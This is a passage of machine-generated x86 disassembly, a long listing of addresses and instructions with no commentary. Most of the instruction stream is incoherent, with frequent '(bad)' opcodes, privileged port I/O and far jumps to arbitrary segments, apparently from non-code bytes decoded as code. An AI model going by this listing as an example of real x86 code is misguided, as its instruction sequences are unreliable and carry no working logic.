  419a6e:	and    edx,DWORD PTR [esp+edx*8+0x7f]
  419a72:	push   ss
  419a73:	xor    BYTE PTR [ebp+0x3b],cl
  419a76:	pop    ecx
  419a77:	add    al,0x80
  419a79:	inc    esi
  419a7a:	or     al,ah
  419a7c:	imul   ecx,esp,0x1e5004bb
  419a82:	fdivr  st(5),st
  419a84:	in     al,dx
  419a85:	xor    eax,0x824d44bd
  419a8a:	sub    cl,al
  419a8c:	jnp    0x419a80
  419a8e:	ins    DWORD PTR es:[edi],dx
  419a8f:	shl    BYTE PTR [eax],cl
  419a91:	pusha  
  419a92:	sbb    ah,ch
  419a94:	pop    ss
  419a95:	aas    
  419a96:	xchg   ebx,eax
  419a97:	xlat   BYTE PTR ds:[ebx]
  419a98:	rol    BYTE PTR [esi-0x6767670f],0xe8
  419a9f:	sahf   
  419aa0:	adc    DWORD PTR [ecx+0x1f],ecx
  419aa3:	(bad)  
  419aa4:	fdivr  QWORD PTR [ebx+0x6c518602]
  419aaa:	jmp    0x7ffb:0x8a280b84
  419ab1:	jl     0x419a6d
  419ab3:	pop    ebx
  419ab4:	cmp    al,BYTE PTR [ecx+0x7a07c4c4]
  419aba:	in     al,0xee
  419abc:	fild   DWORD PTR [ebp+0x4fb37408]
  419ac2:	mov    ah,0x46
  419ac4:	jnp    0x419a82
  419ac6:	xor    BYTE PTR [edx],cl
  419ac8:	iret   
  419ac9:	cs (bad) 
  419acc:	adc    eax,ecx
  419ace:	aaa    
  419acf:	enter  0x3263,0x1b
  419ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad4:	bound  edx,QWORD PTR [esp+esi*4+0x1d]
  419ad8:	mov    ecx,0xad3f67c0
  419add:	push   ebx
  419ade:	fild   WORD PTR [edx+0x2c]
  419ae1:	out    0xa5,al
  419ae3:	loop   0x419b56
  419ae5:	dec    eax
  419ae6:	rcl    ch,1
  419ae8:	fisub  WORD PTR [edi-0x2d]
  419aeb:	shr    DWORD PTR [edx+ecx*8],cl
  419aee:	sub    eax,0x45618fb7
  419af3:	mov    ecx,0x112dbe9b
  419af8:	scas   eax,DWORD PTR es:[edi]
  419af9:	out    0xdc,eax
  419afb:	pop    ebp
  419afc:	cmp    esi,DWORD PTR [ebx+0x4f]
  419aff:	push   ss
  419b00:	jp     0x419b12
  419b02:	jmp    0x14a1a650
  419b07:	or     bl,BYTE PTR [ecx+eiz*4-0x4336e04]
  419b0e:	xlat   BYTE PTR ds:[ebx]
  419b0f:	and    bh,ah
  419b11:	or     DWORD PTR ds:0xad93fbc3,esi
  419b17:	stos   DWORD PTR es:[edi],eax
  419b18:	fsubp  st(4),st
  419b1a:	or     BYTE PTR [ebx+0x146cc118],dh
  419b20:	push   esi
  419b21:	or     al,BYTE PTR [eax+edi*4+0xd]
  419b25:	jl     0x419b2d
  419b27:	scas   al,BYTE PTR es:[edi]
  419b28:	call   0x3396:0x31a2da7e
  419b2f:	cmp    al,0x1e
  419b31:	jmp    0x12e3:0xb4d63b3c
  419b38:	inc    ebx
  419b39:	jmp    0xf072368d
  419b3e:	push   esi
  419b3f:	push   ss
  419b40:	adc    esi,eax
  419b42:	outs   dx,BYTE PTR ds:[esi]
  419b43:	sbb    eax,0x749aa0e8
  419b48:	ret    
  419b49:	or     eax,DWORD PTR [ebp-0x7d]
  419b4c:	and    BYTE PTR [esi],ah
  419b4e:	mov    ebp,0x1f8961ab
  419b53:	not    BYTE PTR [edx]
  419b55:	test   edx,0x7bcec4cf
  419b5b:	sbb    eax,esi
  419b5d:	mov    bl,0xe8
  419b5f:	(bad)  
  419b61:	xchg   ecx,eax
  419b62:	ret    
  419b63:	es jnp 0x419b3b
  419b66:	cmc    
  419b67:	outs   dx,DWORD PTR ds:[esi]
  419b68:	arpl   WORD PTR [esi+0x24],sp
  419b6b:	jo     0x419b29
  419b6d:	mov    esi,0x67620724
  419b72:	sub    dh,bh
  419b74:	xor    eax,0xed1d719d
  419b79:	xchg   edx,eax
  419b7a:	(bad)  
  419b7b:	lock inc ebp
  419b7d:	cs xchg ebx,eax
  419b7f:	mov    dl,0xc1
  419b81:	stos   BYTE PTR es:[edi],al
  419b82:	mov    ds:0x864c4d9d,eax
  419b87:	cmp    bl,BYTE PTR [ecx+0x41]
  419b8a:	sbb    al,bl
  419b8c:	sub    BYTE PTR [edx-0x2748008f],bl
  419b92:	dec    ecx
  419b93:	adc    al,0xd1
  419b95:	xor    DWORD PTR [ecx+0x2af36766],ebx
  419b9b:	adc    eax,0x712d7648
  419ba0:	fisubr DWORD PTR [edi-0x76ae22d]
  419ba6:	push   esp
  419ba7:	inc    edx
  419ba8:	arpl   WORD PTR [edx-0x5b],si
  419bab:	dec    ecx
  419bac:	stos   BYTE PTR es:[edi],al
  419bad:	push   es
  419bae:	outs   dx,DWORD PTR ds:[esi]
  419baf:	mov    ebp,0xcf60b341
  419bb4:	rcr    BYTE PTR [edi-0x41],0xe7
  419bb8:	mov    esi,0x31f30723
  419bbd:	xor    edx,ecx
  419bbf:	loope  0x419b60
  419bc1:	or     eax,0xdc30c91a
  419bc6:	mov    edi,0x2646be94
  419bcb:	push   0x8b22bd16
  419bd0:	adc    DWORD PTR [esi+0x50],ebp
  419bd3:	mov    ch,BYTE PTR [edi+0x7b]
  419bd6:	ds test eax,0x6f8c0df9
  419bdc:	jbe    0x419ba5
  419bde:	enter  0x3a36,0xa2
  419be2:	and    al,0xe4
  419be4:	test   al,0xe7
  419be6:	add    al,0xaa
  419be8:	push   0x8911e291
  419bed:	into   
  419bee:	jae    0x419beb
  419bf0:	repz imul ebp,ebp,0x1d157e0b
  419bf7:	sub    ah,BYTE PTR [ebx]
  419bf9:	dec    esp
  419bfa:	scas   al,BYTE PTR es:[edi]
  419bfb:	adc    ebp,edx
  419bfd:	push   0x6d
  419bff:	mov    ebp,0xa3cb9f58
  419c04:	pop    ecx
  419c05:	stc    
  419c06:	fistp  QWORD PTR [edx+0x72]
  419c09:	xor    edx,DWORD PTR [edi]
  419c0b:	ins    DWORD PTR es:[edi],dx
  419c0c:	jg     0x419c7b
  419c0e:	dec    eax
  419c0f:	mov    ebp,0x57b4620b
  419c14:	clc    
  419c15:	(bad)  
  419c16:	and    eax,0x897a367f
  419c1b:	jl     0x419c6f
  419c1d:	push   ss
  419c1e:	sahf   
  419c1f:	outs   dx,BYTE PTR ds:[esi]
  419c20:	and    al,0xfc
  419c22:	xor    edx,DWORD PTR [edx+0x48c7fc3f]
  419c28:	mov    dl,0xa
  419c2a:	mov    ah,0x87
  419c2c:	sbb    DWORD PTR ds:[esi+0x4f],edi
  419c30:	call   0xcdf7:0x4d6cf177
  419c37:	aaa    
  419c38:	xor    al,0x49
  419c3a:	scas   al,BYTE PTR es:[edi]
  419c3b:	loope  0x419c1c
  419c3d:	add    al,0xc7
  419c3f:	xor    edx,DWORD PTR [eax]
  419c41:	dec    edi
  419c42:	ins    DWORD PTR es:[edi],dx
  419c43:	pop    ebp
  419c44:	jbe    0x419bce
  419c46:	js     0x419cc5
  419c48:	mov    bh,0xb3
  419c4a:	xor    eax,0x323d3618
  419c4f:	cmp    eax,ebp
  419c51:	mov    esp,DWORD PTR [edi-0xf0c8508]
  419c57:	loope  0x419c23
  419c59:	xchg   edx,eax
  419c5a:	add    edi,DWORD PTR [edi+0x1a625db0]
  419c60:	push   ss
  419c61:	push   ecx
  419c62:	gs sub eax,0x77feeb7
  419c68:	mov    ah,0x7
  419c6a:	imul   edx,DWORD PTR [esi-0x7194cab6],0xa5bad4b7
  419c74:	das    
  419c75:	pop    ecx
  419c76:	mov    edx,0x6a39962e
  419c7b:	out    0xf1,al
  419c7d:	xchg   BYTE PTR [ebx-0x44097676],bl
  419c83:	pop    edx
  419c84:	lea    eax,[esi]
  419c86:	and    DWORD PTR [edi+ebx*4],0xf6c1bdef
  419c8d:	inc    edi
  419c8e:	or     DWORD PTR ds:0xc2ecaa14,edi
  419c94:	cli    
  419c95:	mov    DWORD PTR [ebp-0x748c949f],ebp
  419c9b:	in     eax,dx
  419c9c:	mov    ds:0x8b9511b0,al
  419ca1:	mov    eax,0x8fb906d9
  419ca6:	sub    al,0x4c
  419ca8:	jae    0x419c2c
  419caa:	inc    esi
  419cab:	(bad)  
  419cac:	jmp    0x419d0e
  419cae:	into   
  419caf:	mov    edi,ebp
  419cb1:	mov    ds:0x7d69bafa,al
  419cb6:	jl     0x419c92
  419cb8:	or     BYTE PTR [ebx+esi*4],bl
  419cbb:	dec    eax
  419cbc:	or     BYTE PTR [eax-0xf987553],ch
  419cc2:	leave  
  419cc3:	cdq    
  419cc4:	mov    edx,ebp
  419cc6:	(bad)  
  419cc8:	mov    bh,0x3f
  419cca:	rcr    DWORD PTR [ebp-0x27],cl
  419ccd:	push   ds
  419cce:	call   0xc56c9e96
  419cd3:	add    ebp,DWORD PTR ds:0x2015b941
  419cd9:	lds    esp,FWORD PTR [eax]
  419cdb:	lods   al,BYTE PTR ds:[esi]
  419cdc:	lods   al,BYTE PTR ds:[esi]
  419cdd:	inc    esi
  419cde:	and    al,0xbb
  419ce0:	rol    dh,1
  419ce2:	je     0x419cab
  419ce4:	mov    ebx,0x90cdeefb
  419ce9:	inc    ebx
  419cea:	es call 0xf97838fd
  419cf0:	sbb    bh,BYTE PTR [ecx]
  419cf2:	xchg   ecx,eax
  419cf3:	mov    ecx,0x56230c69
  419cf8:	dec    edi
  419cf9:	xchg   ecx,eax
  419cfa:	inc    ebp
  419cfb:	jno    0x419ce3
  419cfd:	aad    0x6a
  419cff:	jge    0x419d5f
  419d01:	iret   
  419d02:	push   ds
  419d03:	adc    edx,0xffffffae
  419d06:	repz call 0xd62c:0x1d6f1006
  419d0e:	aam    0xb1
  419d10:	sub    bl,dh
  419d12:	push   ebx
  419d13:	xchg   edx,eax
  419d14:	bound  ebp,QWORD PTR [eax]
  419d16:	fdivr  QWORD PTR [esi-0x2e0f651e]
  419d1c:	gs cmc 
  419d1e:	mov    dh,0x4
  419d20:	(bad)  
  419d21:	xor    dl,BYTE PTR [edi]
  419d23:	mov    edx,0x1a83da27
  419d28:	jle    0x419cef
  419d2a:	mov    ch,0x5f
  419d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d2d:	sahf   
  419d2e:	(bad)  
  419d2f:	mov    bl,0xa2
  419d31:	pop    edx
  419d32:	mul    BYTE PTR [ebp+eiz*1-0x1f24a852]
  419d39:	xchg   edx,eax
  419d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d3b:	add    DWORD PTR [edx*8+0x467df83f],0xffffffbf
  419d43:	mov    esp,0x7a1010da
  419d48:	add    ah,BYTE PTR [eax]
  419d4a:	pop    esi
  419d4b:	test   eax,0xb077e1e
  419d50:	jle    0x419cf5
  419d52:	pop    ebp
  419d53:	pushf  
  419d54:	and    BYTE PTR [ecx+0x278f574c],ch
  419d5a:	xchg   ecx,eax
  419d5b:	ffreep st(1)
  419d5d:	stos   BYTE PTR es:[edi],al
  419d5e:	pop    eax
  419d5f:	cli    
  419d60:	mov    eax,0xa0eef03c
  419d65:	xchg   esp,eax
  419d66:	dec    edi
  419d67:	into   
  419d68:	sub    BYTE PTR [ebx-0x6b],cl
  419d6b:	cmp    eax,0xfe3a9082
  419d70:	mov    edx,0x37689446
  419d75:	dec    esi
  419d76:	int    0x1b
  419d78:	sti    
  419d79:	jge    0x419de2
  419d7b:	xchg   esp,eax
  419d7c:	pop    esp
  419d7d:	jbe    0x419d37
  419d7f:	lods   eax,DWORD PTR ds:[esi]
  419d80:	adc    cl,BYTE PTR [edi+0x145239db]
  419d86:	pop    esp
  419d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d88:	js     0x419d75
  419d8a:	mov    ebp,0xe233ce91
  419d8f:	cld    
  419d90:	mov    edi,DWORD PTR [esi+ebx*2]
  419d93:	std    
  419d94:	hlt    
  419d95:	imul   ecx,DWORD PTR [ecx-0x65],0xe7920f4c
  419d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9d:	iret   
  419d9e:	repz (bad) 
  419da0:	lods   al,BYTE PTR ds:[esi]
  419da1:	sub    ecx,DWORD PTR [edi+0x47]
  419da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da5:	jmp    0xf44:0x854d751d
  419dac:	cmc    
  419dad:	and    dh,BYTE PTR [edi-0x272243dd]
  419db3:	mov    DWORD PTR [esi],esi
  419db5:	xchg   bl,dh
  419db7:	popa   
  419db8:	cli    
  419db9:	dec    esp
  419dba:	outs   dx,BYTE PTR ds:[esi]
  419dbb:	ins    DWORD PTR es:[edi],dx
  419dbc:	adc    DWORD PTR [ebx-0x44],eax
  419dbf:	test   BYTE PTR [eax+0x6e],bl
  419dc2:	and    ah,dh
  419dc4:	xchg   esi,eax
  419dc5:	inc    edx
  419dc6:	add    ebx,eax
  419dc8:	dec    eax
  419dc9:	dec    edi
  419dca:	mov    al,ds:0x572ed8ce
  419dcf:	sub    ebp,eax
  419dd1:	jecxz  0x419d55
  419dd3:	cmc    
  419dd4:	and    eax,0x8eaf71b
  419dd9:	nop
  419dda:	pusha  
  419ddb:	(bad)  
  419ddc:	mov    esi,0x2596c981
  419de1:	adc    BYTE PTR [esi],bh
  419de3:	pop    esp
  419de4:	rol    DWORD PTR [ebx+0x78],1
  419de7:	jbe    0x419d82
  419de9:	mov    bl,BYTE PTR [edi-0x34c14a71]
  419def:	inc    edx
  419df0:	nop
  419df1:	fidiv  DWORD PTR [ebp-0x17b1cd58]
  419df7:	outs   dx,DWORD PTR ds:[esi]
  419df8:	cmp    DWORD PTR [ebp+0x37],ebx
  419dfb:	mov    ds:0x21bb8e29,al
  419e00:	mov    edi,0x93b64c33
  419e05:	les    ebx,FWORD PTR [eax-0x9edec76]
  419e0b:	dec    ebx
  419e0c:	push   esi
  419e0d:	push   ebx
  419e0e:	sbb    DWORD PTR [ecx-0x11],eax
  419e11:	mov    al,ds:0x4734c6f9
  419e16:	fnsave gs:[eax]
  419e19:	ins    BYTE PTR es:[edi],dx
  419e1a:	loope  0x419e81
  419e1c:	sub    al,0x39
  419e1e:	call   0xb719:0x1921c728
  419e25:	push   DWORD PTR [esi-0x37]
  419e28:	shr    ebp,0x41
  419e2b:	test   eax,0x86cae49
  419e30:	je     0x419dd7
  419e32:	int    0x37
  419e34:	jne    0x419de1
  419e36:	jb     0x419dd4
  419e38:	ins    DWORD PTR es:[edi],dx
  419e39:	mov    ah,0xbe
  419e3b:	popa   
  419e3c:	jns    0x419e4d
  419e3e:	retf   
  419e3f:	fistp  WORD PTR [esi-0x1de70d41]
  419e45:	adc    edx,DWORD PTR [ecx-0x406e2a4d]
  419e4b:	call   0x10c4:0x80dd97a2
  419e52:	mov    edx,0x751e0e00
  419e57:	sbb    ebp,DWORD PTR [edi+0x704f95a3]
  419e5d:	jns    0x419e65
  419e5f:	or     cl,cl
  419e61:	sub    al,0xf4
  419e63:	fistp  QWORD PTR [ebx-0xc]
  419e66:	arpl   WORD PTR [edx],bx
  419e68:	outs   dx,DWORD PTR ds:[esi]
  419e69:	enter  0xac2b,0xb7
  419e6d:	push   esi
  419e6e:	nop
  419e6f:	cmp    ah,BYTE PTR [edx-0x4a]
  419e72:	add    eax,0xe9053f36
  419e77:	jbe    0x419e1b
  419e79:	xchg   ebp,eax
  419e7a:	inc    ebp
  419e7b:	ret    0xa939
  419e7e:	push   ds
  419e7f:	call   0xeeee:0x5fb9b7ce
  419e86:	pop    esp
  419e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e88:	xchg   edi,eax
  419e89:	dec    esp
  419e8a:	cdq    
  419e8b:	pop    eax
  419e8c:	cdq    
  419e8d:	addr16 call 0x3895:0x87617dfb
  419e95:	cmp    dl,dl
  419e97:	sahf   
  419e98:	call   0xf8257535
  419e9d:	sub    BYTE PTR [ecx+0x5],bl
  419ea0:	inc    edi
  419ea1:	in     eax,dx
  419ea2:	in     al,dx
  419ea3:	add    eax,0xb652b77b
  419ea8:	test   BYTE PTR [edi],0x34
  419eab:	test   eax,0x58ddb903
  419eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419eb1:	ja     0x419ed1
  419eb3:	retf   
  419eb4:	and    al,0x88
  419eb6:	(bad)  
  419eb7:	pop    esi
  419eb8:	xor    eax,0x16448282
  419ebd:	mov    al,ds:0x5081c2aa
  419ec2:	dec    esi
  419ec3:	jge    0x419f1e
  419ec5:	dec    edi
  419ec6:	dec    eax
  419ec7:	xchg   ecx,eax
  419ec8:	(bad)  
  419ec9:	push   eax
  419eca:	push   0xffffff9c
  419ecc:	xchg   ecx,eax
  419ecd:	dec    eax
  419ece:	xlat   BYTE PTR ds:[ebx]
  419ecf:	imul   ebp,DWORD PTR [ebx],0xfec6823
  419ed5:	mov    cs,WORD PTR [esi]
  419ed7:	lods   eax,DWORD PTR ds:[esi]
  419ed8:	cmp    al,0x27
  419eda:	pop    edx
  419edb:	dec    eax
  419edc:	ror    BYTE PTR [ebx+eiz*1],0xb9
  419ee0:	sub    edi,DWORD PTR [edi-0x27]
  419ee3:	daa    
  419ee4:	mov    eax,ds:0x201d7868
  419ee9:	sbb    DWORD PTR [ecx+0x4e],edx
  419eec:	lea    edx,[eax+0x787c1f25]
  419ef2:	jno    0x419eb0
  419ef4:	push   ds
  419ef5:	(bad)  
  419ef6:	dec    ebp
  419ef7:	mov    bl,0xef
  419ef9:	pop    ss
  419efa:	fstp   TBYTE PTR [eax+0x27d3d6d]
  419f00:	jnp    0x419ec5
  419f02:	ret    
  419f03:	enter  0x3e35,0x2
  419f07:	pop    ebp
  419f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f09:	jp     0x419f86
  419f0b:	dec    edi
  419f0c:	rcl    BYTE PTR [esp+ebp*1+0x1e],1
  419f10:	mov    al,ds:0x32e094e1
  419f15:	jle    0x419f14
  419f17:	fwait
  419f18:	iret   
  419f19:	bound  eax,QWORD PTR [esi+edi*4]
  419f1c:	and    DWORD PTR [ebx],0x445f45ea
  419f22:	shl    DWORD PTR [edi+0x10103c84],0x3
  419f29:	fcmove st,st(2)
  419f2b:	pop    ebp
  419f2c:	xchg   ebp,eax
  419f2d:	sti    
  419f2e:	pop    edx
  419f2f:	or     al,BYTE PTR ds:0xc81e8e69
  419f35:	dec    WORD PTR [ecx]
  419f38:	push   esi
  419f39:	xchg   edi,eax
  419f3a:	arpl   WORD PTR [ecx],dx
  419f3c:	push   edx
  419f3d:	test   DWORD PTR [eax+0x3b],eax
  419f40:	and    DWORD PTR [edx],0xffffffd1
  419f43:	jmp    0xa4712005
  419f48:	into   
  419f49:	repnz add DWORD PTR [esp+ecx*8],0x2168291e
  419f51:	aad    0x9d
  419f53:	loopne 0x419f50
  419f55:	add    edi,eax
  419f57:	pop    ebp
  419f58:	outs   dx,DWORD PTR ds:[esi]
  419f59:	or     eax,DWORD PTR [eiz*2+0x5f1b2ce5]
  419f60:	into   
  419f61:	mov    ebx,0xf7060a7b
  419f66:	and    BYTE PTR [ebx-0x1c],bl
  419f69:	ret    
  419f6a:	mov    WORD PTR [ebp+0x451cabcf],ss
  419f70:	outs   dx,BYTE PTR ds:[esi]
  419f71:	and    edi,DWORD PTR [ecx+0x5f85a96a]
  419f77:	and    ebx,esi
  419f79:	out    0xdf,al
  419f7b:	inc    esi
  419f7c:	push   0xfdf2f376
  419f81:	xchg   DWORD PTR [eax-0x16],ebx
  419f84:	push   esp
  419f85:	push   ebx
  419f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f87:	outs   dx,BYTE PTR ds:[esi]
  419f88:	ror    BYTE PTR [eax],0xca
  419f8b:	push   ebx
  419f8c:	stos   BYTE PTR es:[edi],al
  419f8d:	pop    esp
  419f8e:	not    DWORD PTR [eax]
  419f90:	jle    0x419f71
  419f92:	xchg   edi,eax
  419f93:	mov    eax,0x2cb126
  419f98:	ret    
  419f99:	sahf   
  419f9a:	sbb    DWORD PTR [edx+0xb028ef7],edx
  419fa0:	(bad)  
  419fa1:	dec    ebx
  419fa2:	pop    ebx
  419fa3:	dec    esp
  419fa4:	ror    BYTE PTR [edx-0x41],cl
  419fa7:	sti    
  419fa8:	test   eax,0xc1e75eb8
  419fad:	jmp    0xa486:0x16c4746
  419fb4:	mov    edi,0x4518ec92
  419fb9:	outs   dx,DWORD PTR ds:[esi]
  419fba:	xchg   ebp,eax
  419fbb:	stc    
  419fbc:	in     al,0x3f
  419fbe:	pop    ecx
  419fbf:	dec    ebp
  419fc0:	(bad)  
  419fc1:	sub    al,0xd6
  419fc3:	stos   DWORD PTR es:[edi],eax
  419fc4:	lock stos BYTE PTR es:[edi],al
  419fc6:	jmp    0x419f5f
  419fc8:	fstp   st(0)
  419fca:	xchg   DWORD PTR ds:0x18e63d60,ebx
  419fd0:	or     al,0x55
  419fd2:	inc    ebp
  419fd3:	xchg   ecx,eax
  419fd4:	or     edx,DWORD PTR [esi-0x1]
  419fd7:	fs dec ebp
  419fd9:	jg     0x41a00d
  419fdb:	dec    eax
  419fdc:	out    dx,al
  419fdd:	mov    dl,dl
  419fdf:	xor    eax,0x6cdfcdd3
  419fe4:	pop    ebx
  419fe5:	(bad)  
  419fe7:	cld    
  419fe8:	(bad)  
  419fe9:	jmp    0x419f70
  419feb:	jmp    0x419fe8
  419fed:	mov    ds:0x6ae226f6,al
  419ff2:	xchg   ebx,eax
  419ff3:	mov    ecx,0x751e5feb
  419ff8:	pop    ss
  419ff9:	daa    
  419ffa:	sbb    ch,BYTE PTR [ebp-0x71]
  419ffd:	repz mov ds:0xa489c31b,eax
  41a003:	inc    ebx
  41a004:	jmp    0x419f8d
  41a006:	imul   eax,ecx,0xfffffffd
  41a009:	mov    dl,0xbd
  41a00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a00c:	push   edx
  41a00d:	enter  0x984f,0xdf
  41a011:	cwde   
  41a012:	pop    ss
  41a013:	shl    DWORD PTR [ecx-0x27],0xb6
  41a017:	mov    ebp,DWORD PTR [esp+eax*1+0x6bec26cf]
  41a01e:	jmp    0x419fc7
  41a020:	imul   ebx,edx,0x8004820e
  41a026:	sbb    ax,0xa2da
  41a02a:	out    dx,al
  41a02b:	(bad)  
  41a02c:	mov    bl,0x6e
  41a02e:	sub    al,0xbf
  41a030:	mov    ds:0xd5bcd519,eax
  41a035:	dec    ecx
  41a036:	pop    edx
  41a038:	fadd   st(3),st
  41a03a:	cld    
  41a03b:	xchg   ebx,eax
  41a03c:	iret   
  41a03d:	rcr    DWORD PTR [edi+0x4409855e],0x5e
  41a044:	mov    esi,0xfd022acd
  41a049:	and    DWORD PTR [edi],edx
  41a04b:	das    
  41a04c:	repnz pop ebx
  41a04e:	pushf  
  41a04f:	jo     0x41a073
  41a051:	rcr    BYTE PTR [edx-0x414416f8],1
  41a057:	hlt    
  41a058:	xor    dl,bl
  41a05a:	push   0xffffffcc
  41a05c:	aam    0xbe
  41a05e:	inc    eax
  41a05f:	test   BYTE PTR [ebx-0xea9b179],dh
  41a065:	stos   BYTE PTR es:[edi],al
  41a066:	xor    eax,0x584f1eb7
  41a06b:	cld    
  41a06c:	lea    ebx,[edi*8+0x7ba14066]
  41a073:	mov    ss,WORD PTR [ecx-0x7d190142]
  41a079:	jmp    0x41a0dc
  41a07b:	hlt    
  41a07c:	adc    esi,edx
  41a07e:	push   eax
  41a07f:	jbe    0x41a007
  41a081:	(bad)  
  41a082:	out    dx,eax
  41a083:	daa    
  41a084:	mov    dl,0xf0
  41a086:	jb     0x41a09e
  41a088:	xor    al,0x44
  41a08a:	loopne 0x41a019
  41a08c:	outs   dx,BYTE PTR ds:[esi]
  41a08d:	cmp    bh,dl
  41a08f:	cmp    al,0x1d
  41a091:	xor    edx,DWORD PTR [ebx+0x7813e49a]
  41a097:	mov    ds:0xb3675284,al
  41a09c:	popf   
  41a09d:	adc    eax,DWORD PTR [ecx+0x1a]
  41a0a0:	cmp    al,0x4a
  41a0a2:	cld    
  41a0a3:	add    BYTE PTR [edx-0x40],ah
  41a0a6:	adc    ebp,DWORD PTR [ebx]
  41a0a8:	int3   
  41a0a9:	dec    esp
  41a0aa:	ss (bad) 
  41a0ac:	sbb    bh,BYTE PTR [ebx]
  41a0ae:	imul   ecx,ecx,0x238d79ac
  41a0b4:	loopne 0x41a0cf
  41a0b6:	adc    cl,BYTE PTR [edx-0x46]
  41a0b9:	mov    WORD PTR [esp+ebx*1+0x50],ss
  41a0bd:	mov    cl,0x19
  41a0bf:	or     esi,DWORD PTR [esp+edi*4]
  41a0c2:	sahf   
  41a0c3:	mov    ds:0x60020aa1,al
  41a0c8:	hlt    
  41a0c9:	xchg   ebp,eax
  41a0ca:	int3   
  41a0cb:	push   ebp
  41a0cc:	adc    al,0x8a
  41a0ce:	dec    ecx
  41a0cf:	sub    eax,0x13d76646
  41a0d4:	mov    ds:0xdd14bef1,al
  41a0d9:	dec    esi
  41a0da:	icebp  
  41a0db:	shl    DWORD PTR [ecx+ebp*8],cl
  41a0de:	push   0xc9490ecc
  41a0e3:	cld    
  41a0e4:	xor    eax,0x9ee9ac48
  41a0e9:	std    
  41a0ea:	ror    DWORD PTR [ecx-0x71],1
  41a0ed:	cmp    DWORD PTR [ebx],esi
  41a0ef:	add    al,0xa7
  41a0f1:	shl    BYTE PTR ds:0x9bde6c18,cl
  41a0f7:	push   edi
  41a0f8:	test   DWORD PTR [ebx+0x75],ebp
  41a0fb:	out    0x75,al
  41a0fd:	pmovmskb edi,mm2
  41a100:	sbb    cl,BYTE PTR [edi+0x61]
  41a103:	xor    eax,0x2e09881a
  41a108:	shr    esp,1
  41a10a:	cmp    al,0x2d
  41a10c:	inc    BYTE PTR [ebx]
  41a10e:	adc    eax,0x16d78cac
  41a113:	cmp    DWORD PTR fs:[eax],esp
  41a116:	mov    eax,0x94aefb12
  41a11b:	push   ebx
  41a11c:	adc    dh,dl
  41a11e:	push   DWORD PTR [ebp+0x4c]
  41a121:	jbe    0x41a148
  41a123:	in     al,dx
  41a124:	and    al,cl
  41a126:	xor    al,0xb7
  41a128:	repnz xchg esi,eax
  41a12a:	int3   
  41a12b:	dec    edi
  41a12c:	add    DWORD PTR [edx-0xf],ebx
  41a12f:	inc    eax
  41a130:	rcl    DWORD PTR [eax],1
  41a132:	stos   DWORD PTR es:[edi],eax
  41a133:	(bad)  
  41a134:	imul   esi,DWORD PTR [ebp-0x32326a53],0xb177a702
  41a13e:	and    BYTE PTR [esi+0x3c15eee6],dh
  41a144:	mov    al,0xee
  41a146:	xchg   edx,eax
  41a147:	add    eax,0x8480fc10
  41a14c:	sbb    ch,cl
  41a14e:	loope  0x41a140
  41a150:	inc    ebx
  41a151:	xchg   esp,eax
  41a152:	imul   ecx,DWORD PTR [edi+ebx*2],0xffffffd0
  41a156:	push   ss
  41a157:	in     eax,dx
  41a158:	fcomp  DWORD PTR [ebx]
  41a15a:	sub    al,0xd3
  41a15c:	fstp   TBYTE PTR [ecx-0xf]
  41a15f:	sti    
  41a160:	mov    bh,0x3f
  41a162:	xor    dl,BYTE PTR [ecx+eax*1+0x3e]
  41a166:	rcr    BYTE PTR [edx-0x56],1
  41a169:	push   0x6a800db1
  41a16e:	aaa    
  41a16f:	addr16 js 0x41a139
  41a172:	sbb    al,0xd4
  41a174:	pop    es
  41a175:	imul   esp,DWORD PTR [esi+ecx*2-0x6],0x6f62e6c4
  41a17d:	mov    ecx,0x103d8795
  41a182:	in     eax,dx
  41a183:	gs (bad) 
  41a185:	js     0x41a1e7
  41a187:	adc    al,0x67
  41a189:	addr16 jmp 0x41a12c
  41a18c:	adc    BYTE PTR [edi-0x6c],cl
  41a18f:	aam    0x72
  41a191:	push   0x3ffe13f0
  41a196:	gs cmp al,0x6
  41a199:	push   ebp
  41a19a:	scas   al,BYTE PTR es:[edi]
  41a19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a19c:	sbb    DWORD PTR [ebx],0x1e
  41a19f:	pop    es
  41a1a0:	and    eax,0xea6d1eb0
  41a1a5:	(bad)  
  41a1a7:	popf   
  41a1a8:	or     al,0xa4
  41a1aa:	mov    edi,0xd647578b
  41a1af:	jo     0x41a195
  41a1b1:	in     eax,dx
  41a1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b3:	in     eax,0x36
  41a1b5:	ins    DWORD PTR es:[edi],dx
  41a1b6:	jmp    0x7ef490f3
  41a1bb:	mov    eax,0xe1a1b655
  41a1c0:	mov    edi,DWORD PTR [ebp-0x5ffad834]
  41a1c6:	push   ss
  41a1c7:	inc    ebx
  41a1c8:	jno    0x41a166
  41a1ca:	scas   al,BYTE PTR es:[edi]
  41a1cb:	test   BYTE PTR [ebx+0x62],bh
  41a1ce:	clc    
  41a1cf:	sbb    DWORD PTR ds:0x36eff104,eax
  41a1d5:	sbb    eax,DWORD PTR [ebx]
  41a1d7:	xor    eax,0xe9595ac2
  41a1dc:	push   ebx
  41a1dd:	mov    edi,0x2b182e35
  41a1e2:	dec    esi
  41a1e3:	scas   al,BYTE PTR es:[edi]
  41a1e4:	add    al,0x82
  41a1e6:	jp     0x41a21f
  41a1e8:	dec    ecx
  41a1e9:	push   ebp
  41a1ea:	repz out 0xcc,al
  41a1ed:	add    eax,0x7d074a78
  41a1f2:	shl    cl,cl
  41a1f4:	ss xor eax,0x1c5b5b85
  41a1fa:	retf   0xa353
  41a1fd:	out    dx,eax
  41a1fe:	dec    ebp
  41a1ff:	(bad)  
  41a201:	dec    ebp
  41a202:	fld    QWORD PTR [esi-0xf651eba]
  41a208:	ins    DWORD PTR es:[edi],dx
  41a209:	xchg   DWORD PTR [edi],ebp
